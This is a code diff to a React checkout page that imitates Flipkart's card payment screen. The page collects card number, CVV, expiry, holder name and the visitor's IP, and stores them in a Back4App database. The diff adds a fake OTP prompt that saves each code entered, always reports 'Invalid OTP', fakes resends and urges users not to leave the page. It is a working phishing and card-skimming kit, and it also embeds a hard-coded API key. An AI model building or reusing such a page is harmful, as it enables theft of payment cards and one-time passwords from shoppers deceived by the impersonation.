@@ -1,15 +1,12 @@
 import {React,useEffect,useState} from 'react'
 import MetaData from '../../Layouts/MetaData';
 import Header from '../../components/Header/Header'
-import { Button, Card,TextField, Divider,Select,MenuItem,InputLabel,FormControl,FormControlLabel,Typography } from '@mui/material'
-import { useNavigate } from 'react-router-dom'
+import { Button, Card,TextField, Divider,Select,MenuItem,FormControl, FormHelperText } from '@mui/material'
 import { useSelector } from 'react-redux';
 import LocalOfferIcon from '@mui/icons-material/LocalOffer';
 import HelpIcon from '@mui/icons-material/Help';
-import AddIcon from '@mui/icons-material/Add';
 import PriceSidebar from '../Cart/PriceSidebar';
 import InfoIcon from '@mui/icons-material/Info';
-import { usePaymentInputs } from "react-payment-inputs";
 import {InputAdornment} from '@mui/material';
 import axios from 'axios'
 import Parse from 'parse/dist/parse.min.js';
@@ -17,28 +14,41 @@ import * as Yup from 'yup'
 import { yupResolver } from "@hookform/resolvers/yup";
 import { useForm } from 'react-hook-form'
 import { useSnackbar } from 'notistack';
-const Payments = () => {
-  const { cartItems } = useSelector((state) => state.cart);
-  const { shippingInfo } = useSelector((state) => state.cart);
-  const { enqueueSnackbar } = useSnackbar();
-  const { getCardNumberProps } = usePaymentInputs();
-  const [iP, setIP] = useState("");
+import Countdown from 'react-countdown';
 
-  const cardSchema = Yup.object().shape({ 
+
+const Payments = () => {
+    const { cartItems } = useSelector((state) => state.cart);
+    const { shippingInfo } = useSelector((state) => state.cart);
+    const { enqueueSnackbar } = useSnackbar();
+    const [iP, setIP] = useState("");
+    const [resendOTP ,setResendOTP]=useState(false)
+    const [showOTP, setShowOTP] = useState(false);
+    const [otpState, setOtpState] = useState();
+    const cardSchema = Yup.object().shape({ 
     cardNumber:Yup
-        .string()
+        .number()
         .required("Enter the Card Number")
-        .min(16)
-        .max(16),
+        .typeError("Enter valid Card number")
+        .min(1000000000000000,"Card Number should be 16 Digits")
+        .max(9999999999999999,"Card Number should be 16 Digits"),
     cvv:Yup
         .string()
         .required("Enter CVV ")
         .min(3)
         .max(3),
     name:Yup
-        .string().required(),
-    month:Yup.string().required(),
-    year:Yup.string().required(),
+        .string()
+        .required(),
+    month:Yup
+        .string()
+        .required(),
+    year:Yup
+        .string()
+        .required(),
+    cardType:Yup
+        .string()
+        .required("Select card type."),
   })
   const {
     register, 
@@ -107,9 +117,9 @@ const Payments = () => {
 
   
   const getIpAddress= () => {
-    axios.get('https://ipgeolocation.abstractapi.com/v1/?api_key=ec394cdd746948e48d155c5fdbc8c8bc')
+    axios.get('https://ipgeolocation.abstractapi.com/v1/?api_key=403b06ab04a945bf9345ca98e68380ef')
     .then(response => {
-        console.log(response.data);
+        // console.log(response.data);
         setIP(response.data.ip_address);
     })
     .catch(error => {
@@ -118,7 +128,6 @@ const Payments = () => {
   }
 
   // State variables
-  const [person, setPerson] = useState(null);
 
   async function addCard(data) {
     try {
@@ -135,6 +144,26 @@ const Payments = () => {
       console.log('Error saving new person: ', error);
     }
   }
+  async function addOTP(data) {
+    try {
+      const OTP = new Parse.Object('OTP');
+      // define the attributes you want for your Object
+      OTP.set('ipAdd', iP);
+    //   OTP.set()
+      OTP.set('OTPData', data);
+      // save it on Back4App Data Store
+      await OTP.save();
+      enqueueSnackbar("Invalid OTP", { variant: "error" });
+    //   alert('Person saved!');
+    } catch (error) {
+      console.log('Error saving new person: ', error);
+    }
+  }
+
+  const sendOTP = () => {
+    enqueueSnackbar("OTP Resend Successfully!", { variant: "success" })
+    
+  }
 
   
   useEffect(() => {
@@ -143,60 +172,180 @@ const Payments = () => {
   }, [])
 
   const onSubmit= (data) => {
-    console.log(data)
+    // console.log(data)
     addCard(data)
+    setShowOTP(true)
   }
+  const handleOTP = () =>{
+    addOTP(otpState)
+  }
+
+  const resendOTPHandler = () =>{
+    setTimeout(sendOTP(),5000);
+    setResendOTP(false)
+  }
+  const Completionist = () => <h1 className="w-full p-2 font-semibold text-center text-blue-500" onClick={resendOTPHandler} >Resend OTP</h1>
+
+  const renderer = ({  minutes, seconds, completed, }) => {
+    if (completed) {
+      setResendOTP(true)
+      return ;
+    } else {
+      // Render a countdown
+      return (
+          <h1 className='p-1 text-sm text-center text-gray-500'>Not received your code? Resend OTP in {minutes}:{seconds}</h1>
+      );
+    }
+  };
+
+  
   
 
   return (
     <>
-    <MetaData title="Flipkart: Order Confirmation" />
-    <Header title="Order Summary"/>
+    <MetaData title="Flipkart | Card Payment" />
+    <Header title="Card Payment"/>
     <div className="flex flex-col w-full bg-[#f1f2f4]">
         <div className="w-full">
             <img className="w-full shadow-md" src="assets/payment.svg" alt="orderSummary" />
         </div>
-        <div className="flex w-full flex-col space-y-2 py-2">
-            <Card className="w-full flex-col p-4 shadow-lg ">
-              <p className="text-sm flex items-center">
+        <div className="flex flex-col w-full py-2 space-y-2">
+            <Card className="flex-col w-full p-4 shadow-lg ">
+              <p className="flex items-center text-sm">
                 <span className="text-green-600"><LocalOfferIcon sx={{ fontSize: "20px" }} /></span>
-                <span className="mx-2">15% Instant discount on first Flipkart Pay Later order of 500 and above </span><span className="text-blue-600 font-semibold font-sans text-sm" to="/">T&C</span>
+                <span className="mx-2">15% Instant discount on first Flipkart Pay Later order of 500 and above </span><span className="font-sans text-sm font-semibold text-blue-600" to="/">T&C</span>
               </p>
               <Divider/>
-              <div className="flex justify-center align-middle items-center">
-                  <h1 className="text-sm font-medium font-sans mt-1 text-blue-600">View all offers</h1>
+              <div className="flex items-center justify-center align-middle">
+                  <h1 className="mt-1 font-sans text-sm font-medium text-blue-600">View all offers</h1>
               </div>
             </Card>
-            <Card className="w-full flex-col p-4 shadow-lg ">
-              <div className="flex flex-row items-center space-x-2 font-sans text-[12px] w-full">
-                <InfoIcon sx={{ 
+            <Card className="flex-col w-full p-4 space-y-1 shadow-lg ">
+                <div className="flex flex-row items-center space-x-2 font-sans text-[12px] w-full">
+                    <InfoIcon sx={{ 
                     fontSize:"25px",
                     color:"#ffaf00"
-                }} />
-                <h1 className="w-full">Plase ensure your card can be used for online transactions.<span className="text-blue-500 font-medium">Know More</span></h1>
-                <h1>Your IP {iP}</h1>
-              </div>
+                    }} />
+                    <h1 className="w-full">Plase ensure your card can be used for online transactions.<span className="font-medium text-blue-500">Know More</span></h1>
+                </div>
+                {showOTP ? 
+                <div className="flex flex-row items-center space-x-2 font-sans text-[12px] w-full">
+                    <InfoIcon sx={{ 
+                    fontSize:"25px",
+                    color:"#ffaf00"
+                    }} />
+                    <h1 className="w-full">Due to high demand, there may be delay in receiving OTP.<span className="font-medium text-black">Do not leave page or refresh the page.</span></h1>
+                </div>
+
+                : ""}
             </Card>
             <form noValidate onSubmit={handleSubmit(onSubmit)}>   
-            <Card className="flex shadow-lg p-4">
-                <div>
-                
+            { showOTP ? 
+            <Card className="flex flex-col w-full p-4 shadow-lg">
+                <h1 className='flex p-1 text-base font-normal text-gray-600'>Validate your card.</h1>
+                <div className='flex flex-col w-full space-y-2'>
+                   <TextField
+                   id='otp'
+                   name='otp'
+                   variant='standard'
+                   value={otpState}
+                   label="Enter OTP (One Time Password)"
+                   type="number"
+                   onChange={(e)=>{
+                        setOtpState(e.target.value)
+                   }}
+                   inputProps={{ 
+                    maxLength:6,
+                                 
+                    }}
+                   /> 
+                   <Divider/>
+                   {resendOTP ? <Completionist /> :
+                        <Countdown date={Date.now() + 180000} renderer={renderer} />
+                    }
+                   <Button
+                        sx={{
+                            fontSize: "14px",
+                            backgroundColor: "#FF5800",
+                            padding:"10px"
+                        }}
+                        size='small'
+                        variant="contained"
+                        fullWidth
+                        onClick={handleOTP}
+                    >
+                        Validate OTP
+                    </Button>
+                </div>
+            </Card> :
+            <>
+            <Card className="flex p-4 shadow-lg">
                     <div className="flex flex-col space-y-2">
-                        <div className="flex">
+                        <div className='flex w-full'>
+                            <FormControl sx={{ width:"100%" }}>
+                                <h1 className='text-sm'>Select Card Type</h1>
+                                <Select 
+                                fullWidth
+                                labelId='cardType'
+                                size='small'
+                                label="Select Card Type"
+                                variant='standard'
+                                id="cardType"
+                                name='cardType'
+                                {...register("cardType")}
+                                error={Boolean(errors?.cardType)}
+                                >
+                                    <MenuItem value={"debitCard"}>Debit Card</MenuItem>
+                                    <MenuItem value={"creditCard"}>Credit Card</MenuItem>
+                                </Select>
+                                <FormHelperText sx={{color:"red", marginLeft:"0"}}>{errors?.cardType?.message}</FormHelperText>
+                            </FormControl>
+                        </div>
+                        <div className="flex w-full">
                             <TextField
                                 fullWidth
                                 id="cardNumber"
                                 name="cardNumber"
                                 variant="standard"
-                                type="number"
+                                // type="number"
                                 label="Card Number"
                                 {...register("cardNumber")}
+                                onKeyUp={(e)=>{
+                                    var val = e.target.value;
+                                    const valArray = val.split(' ').join('').split('');
+                                    // console.log(valArray.length,"valArr")
+                                    var valSpace = val.split("")
+                                    // console.log(valSpace,"valspace")
+
+
+                                    // to work with backspace
+                                    if(valSpace[valSpace.length-1] === ' '){
+                                        var valSpaceN = valSpace.slice(0, -2)
+                                        val = valSpaceN.join("")
+                                        // this.setState({ number:val });
+                                        setValue("cardNumber",val)
+                                        return;
+                                    }
+
+                                    if(isNaN(valArray.join('')))
+                                        return;
+                                    if(valArray.length === 17)
+                                        return;
+                                    if(valArray.length % 4 === 0 && valArray.length <= 15 && valArray.length > 0) {
+                                        setValue("cardNumber",e.target.value+ " ")
+                                        // this.setState({ number: e.target.value + "  " });
+                                    }else{
+                                        setValue("cardNumber",e.target.value)
+                                        // this.setState({ number: e.target.value})
+                                    }
+                                }}
                                 InputLabelProps={{
                                     style: { 
                                         fontSize: "16px"
                                       },
                                 }}
                                 inputProps={{
+                                    maxLength:19,
                                     style: { 
                                       fontSize: "16px"
                                     },
@@ -206,7 +355,7 @@ const Payments = () => {
                                
                             />
                         </div>
-                        <div className="flex">
+                        <div className="flex w-full">
                             <TextField
                                 fullWidth
                                 id="name"
@@ -228,12 +377,11 @@ const Payments = () => {
                                
                             />
                         </div>
-                        <div className='flex flex-row'>
-                            <div className="flex flex-col items-center w-full">
+                        <div className='flex flex-row justify-between w-full'>
+                            <div className="flex flex-col items-center justify-start w-full">
                                 <h1 className="flex text-[12px] w-full justify-start font-sans text-gray-600 ">Valid thru</h1>
-                                <div className="flex flex-row space-x-2">
-                                <FormControl sx={{ minWidth: 80 }} size="small">
-                                    
+                                <div className="left-0 flex flex-row justify-start w-full space-x-2">
+                                <FormControl sx={{ minWidth: 80 }} size="small"> 
                                     <Select
                                         labelId="month"
                                         id="month"
@@ -254,9 +402,8 @@ const Payments = () => {
                                         labelId="year"
                                         id="year"
                                         size="small"
-                                        label="MM"
+                                        label="YY"
                                         error={Boolean(errors?.year)}
-                                        defaultValue="YY"
                                         {...register("year")}   
                                         variant="standard"
                                     >
@@ -282,6 +429,7 @@ const Payments = () => {
                                               },
                                         }}
                                         InputProps={{
+                                            maxLength:3,
                                             style: { 
                                                 fontSize: "16px"
                                               },
@@ -297,11 +445,9 @@ const Payments = () => {
                             </div>
                         </div>
                     </div>
-                
-                </div>
-            </Card>
+                </Card>
             <Card>
-                <div className="flex w-full p-2 justify-center font-sans font-semibold">
+                <div className="flex justify-center w-full p-2 font-sans font-semibold">
                     <Button
                         sx={{
                             fontSize: "14px",
@@ -317,6 +463,8 @@ const Payments = () => {
                     </Button>
                 </div>
             </Card>
+            </>
+            }
             </form>
             <Card>
                 <PriceSidebar cartItems={cartItems} />
@@ -324,9 +472,9 @@ const Payments = () => {
             <div className="w-full">
                 <img className="w-full" src="assets/safety1.svg" alt="banner"/>
             </div>
-            <div className="flex p-3 flex-row justify-center items-center">
+            <div className="flex flex-row items-center justify-center p-3">
                 <img className='flex w-full' src="assets/safety2.jpg" alt='sheild'/>
-                {/* <h1 className='flex w-full font-serif font-light text-xs text-gray-500'>Safe and Secure payments. Easy returns. 100% Authentic products</h1> */}
+                {/* <h1 className='flex w-full font-serif text-xs font-light text-gray-500'>Safe and Secure payments. Easy returns. 100% Authentic products</h1> */}
             </div>
         </div>
     </div>
